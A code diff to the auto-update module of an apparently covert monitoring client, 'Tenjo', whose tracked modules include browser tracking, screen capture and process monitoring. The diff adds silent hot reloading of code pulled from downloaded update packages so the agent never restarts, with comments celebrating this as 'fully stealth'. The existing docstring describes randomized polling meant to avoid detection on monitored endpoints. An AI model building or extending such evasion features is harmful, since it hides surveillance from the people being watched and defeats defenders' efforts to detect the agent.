@@ -1,7 +1,7 @@
 """
 Tenjo Client Auto-Update Module (Stealth Edition)
 Handles silent background updates with integrity verification, execution windows,
-and randomized polling to avoid detection on monitored endpoints.
+randomized polling, and LIVE UPDATES without restart for maximum stealth.
 """
 
 import json
@@ -21,6 +21,13 @@ from typing import Any, Dict, List, Optional, Tuple
 import hashlib
 import requests
 from urllib.parse import urljoin, urlparse
+
+# FIX #40: Import live update module for hot reload
+try:
+    from .live_update import LiveUpdater, DependencyChecker, PythonInstallationChecker
+    LIVE_UPDATE_AVAILABLE = True
+except ImportError:
+    LIVE_UPDATE_AVAILABLE = False
 
 
 class ClientUpdater:
@@ -89,6 +96,24 @@ class ClientUpdater:
             stealth_mode = getattr(config, 'STEALTH_MODE', False)
             self.logger.setLevel(logging.INFO if not stealth_mode else logging.WARNING)
         self.logger.propagate = False
+
+        # FIX #40: Initialize live updater for hot reload
+        if LIVE_UPDATE_AVAILABLE:
+            self.live_updater = LiveUpdater(self.logger)
+            # Register reloadable modules
+            self.live_updater.register_reloadable_module('src.utils.api_client')
+            self.live_updater.register_reloadable_module('src.modules.browser_tracker')
+            self.live_updater.register_reloadable_module('src.modules.screen_capture')
+            self.live_updater.register_reloadable_module('src.modules.process_monitor')
+        else:
+            self.live_updater = None
+
+        # FIX #41-42: Initialize dependency checker
+        requirements_file = self.install_path / "requirements.txt"
+        if LIVE_UPDATE_AVAILABLE and requirements_file.exists():
+            self.dependency_checker = DependencyChecker(requirements_file, self.logger)
+        else:
+            self.dependency_checker = None
 
     # ------------------------------------------------------------------
     # Internal helpers
@@ -613,6 +638,25 @@ class ClientUpdater:
         except Exception:
             pass
 
+    def _get_updated_files(self, package_path: Path) -> List[Path]:
+        """Extract list of updated files from the package for live reload"""
+        try:
+            import tarfile
+            updated_files = []
+
+            # Open the tarball and list all .py files
+            with tarfile.open(package_path, 'r:gz') as tar:
+                for member in tar.getmembers():
+                    if member.isfile() and member.name.endswith('.py'):
+                        # Convert tarball path to absolute Path object
+                        file_path = self.install_path / member.name
+                        updated_files.append(file_path)
+
+            return updated_files
+        except Exception as exc:
+            self._log(f"Failed to extract file list from package: {exc}", logging.ERROR)
+            return []
+
     # ------------------------------------------------------------------
     # Execution control
     # ------------------------------------------------------------------
@@ -771,6 +815,31 @@ class ClientUpdater:
                 return False
 
             self._maybe_migrate_server_url(version_info)
+
+            # FIX #40: Try live update first (hot reload without restart)
+            if LIVE_UPDATE_AVAILABLE and self.live_updater and self.live_updater.can_update_live(version_info):
+                self._log("Attempting live update without restart", logging.ERROR)
+
+                # Get list of updated files from the package
+                updated_files = self._get_updated_files(package_path)
+
+                if self.live_updater.apply_live_update(updated_files):
+                    self._log("Live update successful - no restart needed", logging.ERROR)
+
+                    if version_info.get('pushed'):
+                        self.notify_update_completed(version_info.get('version', 'unknown'))
+
+                    self.current_version = version_info.get('version', self.current_version)
+                    self._clear_pending_update()
+
+                    # FIX #27: Cleanup temp files
+                    self.cleanup_temp()
+                    self.schedule_next_check()
+
+                    return True  # NO RESTART - fully stealth!
+                else:
+                    self._log("Live update failed, falling back to restart", logging.ERROR)
+                    # Fall through to restart
 
             if version_info.get('pushed'):
                 self.notify_update_completed(version_info.get('version', 'unknown'))
